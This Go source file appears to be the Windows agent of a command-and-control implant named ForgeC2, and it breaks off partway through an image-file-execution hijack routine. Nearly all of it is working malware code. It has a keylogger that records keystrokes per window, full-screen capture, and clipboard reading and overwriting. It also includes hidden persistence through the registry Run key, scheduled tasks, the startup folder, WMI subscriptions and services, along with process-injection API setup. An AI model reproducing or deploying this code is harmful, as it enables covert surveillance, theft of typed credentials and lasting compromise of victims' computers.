//go:build windows
// +build windows

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"image"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/Microsoft/go-winio"
)

// Windows API for pure Go screenshot (no external deps, no cgo)
var (
	user32 = syscall.NewLazyDLL("user32.dll")
	gdi32  = syscall.NewLazyDLL("gdi32.dll")
	shcore = syscall.NewLazyDLL("shcore.dll")
	k32    = syscall.NewLazyDLL("kernel32.dll")
)

var (
	procGetDC                  = user32.NewProc("GetDC")
	procReleaseDC              = user32.NewProc("ReleaseDC")
	procGetSystemMetrics       = user32.NewProc("GetSystemMetrics")
	procSetProcessDPIAware     = user32.NewProc("SetProcessDPIAware")
	procSetProcessDpiAwareness = shcore.NewProc("SetProcessDpiAwareness")
	procCreateCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject           = gdi32.NewProc("SelectObject")
	procBitBlt                 = gdi32.NewProc("BitBlt")
	procGetDIBits              = gdi32.NewProc("GetDIBits")
	procDeleteDC               = gdi32.NewProc("DeleteDC")
	procDeleteObject           = gdi32.NewProc("DeleteObject")
	procOutputDebugStringW     = k32.NewProc("OutputDebugStringW")
	procGetDeviceCaps          = gdi32.NewProc("GetDeviceCaps")
	procGetForegroundWindow    = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW         = user32.NewProc("GetWindowTextW")

	// For process/thread suspend/resume (pause game etc)
	procCreateToolhelp32Snapshot = k32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = k32.NewProc("Process32FirstW")
	procProcess32Next            = k32.NewProc("Process32NextW")
	procThread32First            = k32.NewProc("Thread32First")
	procThread32Next             = k32.NewProc("Thread32Next")
	procOpenThread               = k32.NewProc("OpenThread")
	procSuspendThread            = k32.NewProc("SuspendThread")
	procResumeThread             = k32.NewProc("ResumeThread")
	procCloseHandle              = k32.NewProc("CloseHandle")
	procSetFileAttributesW       = k32.NewProc("SetFileAttributesW")
	procGetThreadContext         = k32.NewProc("GetThreadContext")
	procSetThreadContext         = k32.NewProc("SetThreadContext")

	// for killproc
	procOpenProcess      = k32.NewProc("OpenProcess")
	procTerminateProcess = k32.NewProc("TerminateProcess")

	// for clipboard
	procOpenClipboard    = user32.NewProc("OpenClipboard")
	procCloseClipboard   = user32.NewProc("CloseClipboard")
	procGetClipboardData = user32.NewProc("GetClipboardData")
	procSetClipboardData = user32.NewProc("SetClipboardData")
	procEmptyClipboard   = user32.NewProc("EmptyClipboard")
	procGlobalLock       = k32.NewProc("GlobalLock")
	procGlobalUnlock     = k32.NewProc("GlobalUnlock")
	procGlobalAlloc      = k32.NewProc("GlobalAlloc")
	procGlobalFree       = k32.NewProc("GlobalFree")

	// for process injection (creds / lateral use shells too)
	procOpenProcessEx      = k32.NewProc("OpenProcess")
	procVirtualAllocEx     = k32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = k32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = k32.NewProc("CreateRemoteThread")
	procVirtualFreeEx      = k32.NewProc("VirtualFreeEx")
	procQueueUserAPC       = k32.NewProc("QueueUserAPC")

	// for Hell's Gate syscall injection
	procGetModuleHandleW = k32.NewProc("GetModuleHandleW")
)

func debugLog(msg string) {
	if Debug {
		p, _ := syscall.UTF16PtrFromString("[ForgeC2] " + msg)
		procOutputDebugStringW.Call(uintptr(unsafe.Pointer(p)))
		fmt.Println(msg)
	}
}

// getPlatformSecurityInfo returns (integrity level, isElevated, domain/workgroup)
func getPlatformSecurityInfo() (string, bool, string) {
	integrity := "Medium"
	elevated := false

	// Open process token via raw syscall
	var hToken uintptr
	currentProc, _ := syscall.GetCurrentProcess()
	ret, _, _ := procOpenProcessToken.Call(
		uintptr(currentProc),
		0x0008, // TOKEN_QUERY
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret != 0 && hToken != 0 {
		defer syscall.CloseHandle(syscall.Handle(hToken))

		// GetTokenInformation with TokenIntegrityLevel (class 25)
		var needed uint32
		procGetTokenInformation.Call(hToken, 25, 0, 0, uintptr(unsafe.Pointer(&needed)))
		if needed > 0 {
			buf := make([]byte, needed)
			ret2, _, _ := procGetTokenInformation.Call(
				hToken, 25,
				uintptr(unsafe.Pointer(&buf[0])),
				uintptr(needed),
				uintptr(unsafe.Pointer(&needed)),
			)
			if ret2 != 0 && len(buf) >= 8 {
				// TOKEN_MANDATORY_LABEL: Label.Sid (pointer) + Label.Attributes
				sidPtr := *(*uintptr)(unsafe.Pointer(&buf[0]))
				if sidPtr != 0 {
					// SubAuthorityCount at offset 1 of SID
					subCount := *(*uint8)(unsafe.Pointer(sidPtr + 1))
					if subCount > 0 {
						// Last sub-authority RID at offset 8 + (count-1)*4
						rid := *(*uint32)(unsafe.Pointer(sidPtr + 8 + uintptr(subCount-1)*4))
						switch {
						case rid >= 16384:
							integrity = "System"
							elevated = true
						case rid >= 12288:
							integrity = "High"
							elevated = true
						case rid >= 8192:
							integrity = "Medium"
						case rid >= 4096:
							integrity = "Low"
						default:
							integrity = "Untrusted"
						}
					}
				}
			}
		}
	}

	domain := os.Getenv("USERDOMAIN")
	if domain == "" {
		domain, _ = os.Hostname()
	}
	return integrity, elevated, domain
}

const (
	// System metrics
	SM_XVIRTUALSCREEN  = 76
	SM_YVIRTUALSCREEN  = 77
	SM_CXVIRTUALSCREEN = 78
	SM_CYVIRTUALSCREEN = 79
	SM_CXSCREEN        = 0
	SM_CYSCREEN        = 1

	// GDI
	SRCCOPY    = 0x00CC0020
	CAPTUREBLT = 0x40000000

	BI_RGB         = 0
	DIB_RGB_COLORS = 0

	LOGPIXELSX = 88

	// Process / Thread snapshot
	TH32CS_SNAPPROCESS        = 0x00000002
	TH32CS_SNAPTHREAD         = 0x00000004
	THREAD_SUSPEND_RESUME     = 0x0002
	PROCESS_TERMINATE         = 0x0001
	PROCESS_QUERY_INFORMATION = 0x0400
	MAX_PATH                  = 260
	CF_TEXT                   = 1
	GMEM_MOVEABLE             = 0x0002

	// injection constants
	PROCESS_CREATE_THREAD  = 0x0002
	PROCESS_VM_OPERATION   = 0x0008
	PROCESS_VM_WRITE       = 0x0020
	PROCESS_VM_READ        = 0x0010
	PROCESS_ALL_ACCESS     = 0x1F0FFF
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

type processEntry32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [MAX_PATH]uint16
}

type threadEntry32 struct {
	dwSize             uint32
	cntUsage           uint32
	th32ThreadID       uint32
	th32OwnerProcessID uint32
	tpBasePri          int32
	tpDeltaPri         int32
	dwFlags            uint32
}

// bitmapInfoHeader matches Windows BITMAPINFOHEADER
type bitmapInfoHeader struct {
	biSize          uint32
	biWidth         int32
	biHeight        int32
	biPlanes        uint16
	biBitCount      uint16
	biCompression   uint32
	biSizeImage     uint32
	biXPelsPerMeter int32
	biYPelsPerMeter int32
	biClrUsed       uint32
	biClrImportant  uint32
}

type bitmapInfo struct {
	bmiHeader bitmapInfoHeader
}

func setDPIAware() {
	// Prefer per-monitor awareness v2 if available
	ret, _, _ := procSetProcessDpiAwareness.Call(uintptr(2))
	if ret != 0 {
		// fallback
		procSetProcessDPIAware.Call()
	}
	debugLog("DPI awareness set")
}

func getSystemMetrics(nIndex int32) int32 {
	ret, _, _ := procGetSystemMetrics.Call(uintptr(nIndex))
	return int32(ret)
}

func getDC(hwnd uintptr) uintptr {
	ret, _, _ := procGetDC.Call(hwnd)
	return ret
}

func releaseDC(hwnd, hdc uintptr) {
	procReleaseDC.Call(hwnd, hdc)
}

func getDeviceCaps(hdc uintptr, index int32) int32 {
	ret, _, _ := procGetDeviceCaps.Call(hdc, uintptr(index))
	return int32(ret)
}

func createCompatibleDC(hdc uintptr) uintptr {
	ret, _, _ := procCreateCompatibleDC.Call(hdc)
	return ret
}

func createCompatibleBitmap(hdc uintptr, w, h int32) uintptr {
	ret, _, _ := procCreateCompatibleBitmap.Call(hdc, uintptr(w), uintptr(h))
	return ret
}

func selectObject(hdc, obj uintptr) uintptr {
	ret, _, _ := procSelectObject.Call(hdc, obj)
	return ret
}

func bitBlt(hdcDest uintptr, x, y, w, h int32, hdcSrc uintptr, xSrc, ySrc int32, rop uint32) bool {
	ret, _, _ := procBitBlt.Call(
		hdcDest,
		uintptr(x), uintptr(y), uintptr(w), uintptr(h),
		hdcSrc,
		uintptr(xSrc), uintptr(ySrc),
		uintptr(rop),
	)
	return ret != 0
}

func getDIBits(hdc, hbmp uintptr, startScan, scanLines int32, bits unsafe.Pointer, bi *bitmapInfo, usage uint32) int32 {
	ret, _, _ := procGetDIBits.Call(
		hdc,
		hbmp,
		uintptr(startScan),
		uintptr(scanLines),
		uintptr(bits),
		uintptr(unsafe.Pointer(bi)),
		uintptr(usage),
	)
	return int32(ret)
}

func deleteDC(hdc uintptr) {
	procDeleteDC.Call(hdc)
}

func deleteObject(obj uintptr) {
	procDeleteObject.Call(obj)
}

func getVirtualScreen() (x, y, w, h int32) {
	x = getSystemMetrics(SM_XVIRTUALSCREEN)
	y = getSystemMetrics(SM_YVIRTUALSCREEN)
	w = getSystemMetrics(SM_CXVIRTUALSCREEN)
	h = getSystemMetrics(SM_CYVIRTUALSCREEN)
	if w <= 0 {
		w = getSystemMetrics(SM_CXSCREEN)
	}
	if h <= 0 {
		h = getSystemMetrics(SM_CYSCREEN)
	}
	return
}

// applyHideWindow sets hidden window attr for exec on Windows (called only from windows code path)
func applyHideWindow(cmd *exec.Cmd) {
	if cmd != nil {
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	}
}

func addPersistenceLinux()  {}
func addPersistenceDarwin() {}

// addPersistenceWindows does robust user-level persistence for Windows.
// Copies the binary to %APPDATA%\ForgeC2\forgec2.exe (stable location even if original is deleted).
// Registers multiple auto-start methods (much stronger than single HKCU Run):
// 1. HKCU\...\Run key
// 2. Scheduled Task (schtasks /sc onlogon)
// 3. Startup folder
// Also sets hidden attribute.
func addPersistenceWindows() {
	srcPath, err := os.Executable()
	if err != nil {
		if Debug {
			fmt.Printf("[persist] failed to get exe path: %v\n", err)
		}
		return
	}

	// Stable drop location: %APPDATA%\ForgeC2\forgec2.exe
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.Getenv("LOCALAPPDATA")
	}
	if appData == "" {
		appData = os.TempDir()
	}
	persistDir := filepath.Join(appData, "ForgeC2")
	if err := os.MkdirAll(persistDir, 0755); err != nil {
		if Debug {
			fmt.Printf("[persist] mkdir failed: %v\n", err)
		}
		return
	}

	dstPath := filepath.Join(persistDir, "forgec2.exe")

	// Copy binary if not present or if source is newer (simple check)
	needCopy := true
	if dstInfo, err := os.Stat(dstPath); err == nil {
		if srcInfo, err := os.Stat(srcPath); err == nil {
			if dstInfo.ModTime().After(srcInfo.ModTime()) || dstInfo.Size() == srcInfo.Size() {
				needCopy = false
			}
		}
	}

	if needCopy {
		src, err := os.Open(srcPath)
		if err != nil {
			if Debug {
				fmt.Printf("[persist] open src failed: %v\n", err)
			}
			return
		}
		defer src.Close()

		dst, err := os.Create(dstPath)
		if err != nil {
			if Debug {
				fmt.Printf("[persist] create dst failed: %v\n", err)
			}
			return
		}
		_, err = io.Copy(dst, src)
		dst.Close()
		if err != nil {
			if Debug {
				fmt.Printf("[persist] copy failed: %v\n", err)
			}
			return
		}

		// Try to hide the file
		setHidden(dstPath)
		if Debug {
			fmt.Printf("[persist] copied to %s\n", dstPath)
		}
	}

	// 1. HKCU Run key (classic)
	regCmd := exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "ForgeC2", "/t", "REG_SZ", "/d", dstPath, "/f")
	applyHideWindow(regCmd)
	regOut, regErr := regCmd.CombinedOutput()
	if Debug {
		if regErr != nil {
			fmt.Printf("[persist] HKCU Run failed: %v %s\n", regErr, string(regOut))
		} else {
			fmt.Printf("[persist] HKCU Run registered\n")
		}
	}

	// 2. Scheduled Task (on user logon) - very reliable
	taskName := "ForgeC2"
	schtasks := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", dstPath, "/sc", "onlogon", "/f", "/it")
	applyHideWindow(schtasks)
	taskOut, taskErr := schtasks.CombinedOutput()
	if Debug {
		if taskErr != nil {
			fmt.Printf("[persist] schtasks failed: %v %s\n", taskErr, string(taskOut))
		} else {
			fmt.Printf("[persist] scheduled task created\n")
		}
	}

	// 3. Startup folder (direct exe copy - works without registry)
	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
	os.MkdirAll(startupDir, 0755)
	startupPath := filepath.Join(startupDir, "forgec2.exe")
	if _, err := os.Stat(startupPath); os.IsNotExist(err) {
		// copy again or symlink, simple copy
		if src, err := os.Open(dstPath); err == nil {
			if dst, err := os.Create(startupPath); err == nil {
				io.Copy(dst, src)
				dst.Close()
				setHidden(startupPath)
			}
			src.Close()
		}
	}
	if Debug {
		fmt.Printf("[persist] startup folder persistence attempted: %s\n", startupPath)
	}
}

func setHidden(path string) {
	p, _ := syscall.UTF16PtrFromString(path)
	procSetFileAttributesW.Call(uintptr(unsafe.Pointer(p)), 0x2) // FILE_ATTRIBUTE_HIDDEN
}

// getActiveWindowTitle returns the foreground window title for beacon metadata.
func getActiveWindowTitle() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}
	buf := make([]uint16, 512)
	n, _, _ := procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if n == 0 {
		return ""
	}
	return syscall.UTF16ToString(buf[:n])
}

// captureScreenRGBA captures the full virtual screen as RGBA image.
// We rely on setDPIAware() (called early) so that GetSystemMetrics returns
// the actual physical resolution even on high-DPI setups. No extra scaling
// is applied here anymore.
func captureScreenRGBA() (*image.RGBA, error) {
	setDPIAware()

	x, y, w, h := getVirtualScreen()
	if w <= 0 || h <= 0 {
		return nil, fmt.Errorf("invalid virtual screen dimensions: %dx%d", w, h)
	}

	debugLog(fmt.Sprintf("virtual screen raw: x=%d y=%d w=%d h=%d", x, y, w, h))

	hdc := getDC(0)
	if hdc == 0 {
		return nil, fmt.Errorf("GetDC failed")
	}
	defer releaseDC(0, hdc)

	// Note: because we call setDPIAware() early (in init), GetSystemMetrics
	// already returns physical pixel dimensions on high-DPI displays.
	// We no longer multiply by extra DPI scale here to avoid over-scaling
	// (which was causing partial captures or wrong sizes in some cases).
	dpiX := getDeviceCaps(hdc, LOGPIXELSX)
	debugLog(fmt.Sprintf("DPI: %d, using virtual screen %dx%d", dpiX, w, h))

	hdcMem := createCompatibleDC(hdc)
	if hdcMem == 0 {
		return nil, fmt.Errorf("CreateCompatibleDC failed")
	}
	defer deleteDC(hdcMem)

	hbm := createCompatibleBitmap(hdc, w, h)
	if hbm == 0 {
		return nil, fmt.Errorf("CreateCompatibleBitmap failed")
	}
	defer deleteObject(hbm)

	oldObj := selectObject(hdcMem, hbm)
	defer selectObject(hdcMem, oldObj)

	// Capture including layered windows
	if !bitBlt(hdcMem, 0, 0, w, h, hdc, x, y, SRCCOPY|CAPTUREBLT) {
		// try without CAPTUREBLT as fallback
		bitBlt(hdcMem, 0, 0, w, h, hdc, x, y, SRCCOPY)
	}

	var bi bitmapInfo
	bi.bmiHeader.biSize = uint32(unsafe.Sizeof(bi.bmiHeader))
	bi.bmiHeader.biWidth = w
	bi.bmiHeader.biHeight = -h // negative for top-down DIB
	bi.bmiHeader.biPlanes = 1
	bi.bmiHeader.biBitCount = 32
	bi.bmiHeader.biCompression = BI_RGB
	// biSizeImage left 0; GDI will compute

	pixBuf := make([]byte, int64(w)*int64(h)*4)

	lines := getDIBits(hdcMem, hbm, 0, h, unsafe.Pointer(&pixBuf[0]), &bi, DIB_RGB_COLORS)
	if lines <= 0 {
		return nil, fmt.Errorf("GetDIBits returned %d", lines)
	}

	// BGRA -> RGBA in place
	for i := 0; i < len(pixBuf); i += 4 {
		pixBuf[i], pixBuf[i+2] = pixBuf[i+2], pixBuf[i] // B <-> R
		// alpha channel pixBuf[i+3] usually 0 or undefined -> set 255 for opaque
		pixBuf[i+3] = 0xff
	}

	debugLog(fmt.Sprintf("screenshot captured %dx%d (%d bytes)", w, h, len(pixBuf)))

	return &image.RGBA{
		Pix:    pixBuf,
		Stride: int(w) * 4,
		Rect:   image.Rect(0, 0, int(w), int(h)),
	}, nil
}

// --- Keylogger (Windows) ---

var procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")

func getAsyncKeyState(vk int32) uint16 {
	ret, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
	return uint16(ret)
}

// vkToString converts a virtual key code + modifiers into a human readable token.
func vkToString(vk int, shift bool) string {
	switch vk {
	case 0x08:
		return "[Backspace]"
	case 0x09:
		return "[Tab]"
	case 0x0D:
		return "[Enter]\n"
	case 0x1B:
		return "[Esc]"
	case 0x20:
		return " "
	case 0x2E:
		return "[Del]"
	case 0x25:
		return "[Left]"
	case 0x26:
		return "[Up]"
	case 0x27:
		return "[Right]"
	case 0x28:
		return "[Down]"
	case 0x5B, 0x5C:
		return "[Win]"
	}

	// Letters
	if vk >= 0x41 && vk <= 0x5A {
		if shift {
			return string(rune(vk))
		}
		return string(rune(vk + 0x20))
	}

	// Numbers top row
	if vk >= 0x30 && vk <= 0x39 {
		if shift {
			shiftMap := map[int]string{0x30: ")", 0x31: "!", 0x32: "@", 0x33: "#", 0x34: "$", 0x35: "%", 0x36: "^", 0x37: "&", 0x38: "*", 0x39: "("}
			if s, ok := shiftMap[vk]; ok {
				return s
			}
		}
		return string(rune(vk))
	}

	// Common punctuation / symbols
	if shift {
		shiftPunct := map[int]string{
			0xBA: ":", 0xBB: "+", 0xBC: "<", 0xBD: "_", 0xBE: ">", 0xBF: "?",
			0xC0: "~", 0xDB: "{", 0xDC: "|", 0xDD: "}", 0xDE: "\"",
		}
		if s, ok := shiftPunct[vk]; ok {
			return s
		}
	} else {
		punct := map[int]string{
			0xBA: ";", 0xBB: "=", 0xBC: ",", 0xBD: "-", 0xBE: ".", 0xBF: "/",
			0xC0: "`", 0xDB: "[", 0xDC: "\\", 0xDD: "]", 0xDE: "'",
		}
		if s, ok := punct[vk]; ok {
			return s
		}
	}

	// F-keys etc
	if vk >= 0x70 && vk <= 0x7B {
		return fmt.Sprintf("[F%d]", vk-0x6F)
	}

	return fmt.Sprintf("[0x%02X]", vk)
}

func keyloggerLoop() {
	debugLog("keylogger goroutine started")
	var prev [256]uint16
	lastWindow := ""
	for keylogActive {
		currentWindow := getActiveWindowTitle()
		if currentWindow != lastWindow {
			keylogMu.Lock()
			keylogBuffer.WriteString(fmt.Sprintf("\n[%s] [%s]\n",
				time.Now().Format("2006-01-02 15:04:05"), currentWindow))
			keylogMu.Unlock()
			lastWindow = currentWindow
		}

		for vk := 0; vk < 256; vk++ {
			state := getAsyncKeyState(int32(vk))
			// high bit set = currently down
			if (state&0x8000) != 0 && (prev[vk]&0x8000) == 0 {
				shift := (getAsyncKeyState(0x10) & 0x8000) != 0 // VK_SHIFT
				ch := vkToString(vk, shift)
				keylogMu.Lock()
				keylogBuffer.WriteString(ch)
				keylogMu.Unlock()
			}
			prev[vk] = state
		}
		time.Sleep(12 * time.Millisecond) // balance responsiveness / CPU
	}
	debugLog("keylogger goroutine stopped")
}

// --- Process suspend/resume (pause game/process) ---

func findPIDByName(name string) (uint32, error) {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snap == 0 {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var pe processEntry32
	pe.dwSize = uint32(unsafe.Sizeof(pe))

	ret, _, _ := procProcess32First.Call(snap, uintptr(unsafe.Pointer(&pe)))
	for ret != 0 {
		exe := syscall.UTF16ToString(pe.szExeFile[:])
		if strings.EqualFold(exe, name) || strings.EqualFold(filepath.Base(exe), name) {
			return pe.th32ProcessID, nil
		}
		ret, _, _ = procProcess32Next.Call(snap, uintptr(unsafe.Pointer(&pe)))
	}
	return 0, fmt.Errorf("process not found: %s", name)
}

func suspendProcessWindows(target string) (string, error) {
	var pid uint32
	if p, err := strconv.ParseUint(target, 10, 32); err == nil {
		pid = uint32(p)
	} else {
		p, err := findPIDByName(target)
		if err != nil {
			return "", err
		}
		pid = p
	}

	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
	if snap == 0 {
		return "", fmt.Errorf("snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var te threadEntry32
	te.dwSize = uint32(unsafe.Sizeof(te))

	ret, _, _ := procThread32First.Call(snap, uintptr(unsafe.Pointer(&te)))
	count := 0
	for ret != 0 {
		if te.th32OwnerProcessID == pid {
			h, _, _ := procOpenThread.Call(THREAD_SUSPEND_RESUME, 0, uintptr(te.th32ThreadID))
			if h != 0 {
				procSuspendThread.Call(h)
				procCloseHandle.Call(h)
				count++
			}
		}
		ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
	}
	return fmt.Sprintf("suspended %d threads (pid=%d)", count, pid), nil
}

func resumeProcessWindows(target string) (string, error) {
	var pid uint32
	if p, err := strconv.ParseUint(target, 10, 32); err == nil {
		pid = uint32(p)
	} else {
		p, err := findPIDByName(target)
		if err != nil {
			return "", err
		}
		pid = p
	}

	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
	if snap == 0 {
		return "", fmt.Errorf("snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var te threadEntry32
	te.dwSize = uint32(unsafe.Sizeof(te))

	ret, _, _ := procThread32First.Call(snap, uintptr(unsafe.Pointer(&te)))
	count := 0
	for ret != 0 {
		if te.th32OwnerProcessID == pid {
			h, _, _ := procOpenThread.Call(THREAD_SUSPEND_RESUME, 0, uintptr(te.th32ThreadID))
			if h != 0 {
				procResumeThread.Call(h)
				procCloseHandle.Call(h)
				count++
			}
		}
		ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
	}
	return fmt.Sprintf("resumed %d threads (pid=%d)", count, pid), nil
}

// --- Additional small features ---

func killProcessWindows(target string) (string, error) {
	var pid uint32
	if p, err := strconv.ParseUint(target, 10, 32); err == nil {
		pid = uint32(p)
	} else {
		p, err := findPIDByName(target)
		if err != nil {
			return "", err
		}
		pid = p
	}

	h, _, _ := procOpenProcess.Call(PROCESS_TERMINATE, 0, uintptr(pid))
	if h == 0 {
		return "", fmt.Errorf("open process failed")
	}
	defer procCloseHandle.Call(h)

	ret, _, _ := procTerminateProcess.Call(h, 1)
	if ret == 0 {
		return "", fmt.Errorf("terminate failed")
	}
	return fmt.Sprintf("killed pid %d", pid), nil
}

func clipboardGetWindows() (string, error) {
	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return "", fmt.Errorf("open clipboard failed")
	}
	defer procCloseClipboard.Call()

	h, _, _ := procGetClipboardData.Call(CF_TEXT)
	if h == 0 {
		return "", fmt.Errorf("get clipboard data failed (maybe not text)")
	}

	ptr, _, _ := procGlobalLock.Call(h)
	if ptr == 0 {
		return "", fmt.Errorf("global lock failed")
	}
	defer procGlobalUnlock.Call(h)

	// CF_TEXT is ANSI bytes
	return string((*[1 << 20]byte)(unsafe.Pointer(ptr))[:]), nil
}

func clipboardSetWindows(data string) error {
	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return fmt.Errorf("open clipboard failed")
	}
	defer procCloseClipboard.Call()

	procEmptyClipboard.Call()

	// allocate global memory
	size := len(data) + 1
	hMem, _, _ := procGlobalAlloc.Call(GMEM_MOVEABLE, uintptr(size))
	if hMem == 0 {
		return fmt.Errorf("global alloc failed")
	}

	ptr, _, _ := procGlobalLock.Call(hMem)
	if ptr != 0 {
		copy((*[1 << 20]byte)(unsafe.Pointer(ptr))[:], []byte(data))
		procGlobalUnlock.Call(hMem)
	}

	procSetClipboardData.Call(CF_TEXT, hMem)
	return nil
}

// ═══════════════════════════════════════════════════════════════════════════════
// Persistence Toolkit — 8 methods for maintaining access on Windows
// ═══════════════════════════════════════════════════════════════════════════════

func applyPersistence(method string, args string) string {
	switch method {
	case "registry":
		return persistRegistryRun(args)
	case "scheduled_task":
		return persistScheduledTask(args)
	case "startup_folder":
		return persistStartupFolder(args)
	case "wmi":
		return persistWMI(args)
	case "service":
		return persistService(args)
	case "image_file":
		return persistIFEO(args)
	case "com_hijack":
		return persistCOMHijack(args)
	case "dll_search_order":
		return persistDLLHijack(args)
	default:
		return fmt.Sprintf("unknown persistence method: %s", method)
	}
}

func persistRegistryRun(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("registry: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	cmd := exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "ForgeC2", "/t", "REG_SZ", "/d", binaryPath, "/f")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("registry: failed: %v %s", err, string(out))
	}
	return fmt.Sprintf("registry: persistence added via HKCU Run key -> %s", binaryPath)
}

func persistScheduledTask(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("scheduled_task: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	taskName := "ForgeC2Update"
	cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", binaryPath, "/sc", "onlogon", "/f", "/it")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("scheduled_task: failed: %v %s", err, string(out))
	}
	return fmt.Sprintf("scheduled_task: created task '%s' -> %s", taskName, binaryPath)
}

func persistStartupFolder(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("startup_folder: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.Getenv("LOCALAPPDATA")
	}
	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
	if err := os.MkdirAll(startupDir, 0755); err != nil {
		return fmt.Sprintf("startup_folder: mkdir failed: %v", err)
	}
	dst := filepath.Join(startupDir, "forgec2.exe")
	src, err := os.Open(binaryPath)
	if err != nil {
		return fmt.Sprintf("startup_folder: open src failed: %v", err)
	}
	defer src.Close()
	dstFile, err := os.Create(dst)
	if err != nil {
		return fmt.Sprintf("startup_folder: create dst failed: %v", err)
	}
	defer dstFile.Close()
	if _, err := io.Copy(dstFile, src); err != nil {
		return fmt.Sprintf("startup_folder: copy failed: %v", err)
	}
	setHidden(dst)
	return fmt.Sprintf("startup_folder: copied to %s", dst)
}

func persistWMI(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("wmi: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	psCmd := fmt.Sprintf(`
$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filter.Name = "ForgeC2Filter"
$filter.Put() | Out-Null
$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = "ForgeC2Consumer"
$consumer.CommandLineTemplate = "%s"
$consumer.Put() | Out-Null
$binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$binding.Filter = "__EventFilter.Name='ForgeC2Filter'"
$binding.Consumer = "CommandLineEventConsumer.Name='ForgeC2Consumer'"
$binding.Put() | Out-Null
Write-Output "WMI persistence added"
`, binaryPath)
	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psCmd)
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("wmi: failed: %v %s", err, string(out))
	}
	return fmt.Sprintf("wmi: event subscription created for -> %s", binaryPath)
}

func persistService(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("service: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	serviceName := "ForgeC2Svc"
	cmd := exec.Command("sc", "create", serviceName, "binPath=", binaryPath, "start=", "auto", "DisplayName=", "ForgeC2 Service")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("service: sc create failed: %v %s", err, string(out))
	}
	cmd2 := exec.Command("sc", "start", serviceName)
	applyHideWindow(cmd2)
	out2, err2 := cmd2.CombinedOutput()
	if err2 != nil {
		return fmt.Sprintf("service: created but start failed: %v %s", err2, string(out2))
	}
	return fmt.Sprintf("service: created and started '%s' -> %s", serviceName, binaryPath)
}

func persistIFEO(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("image_file: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	target := "sethc.exe"
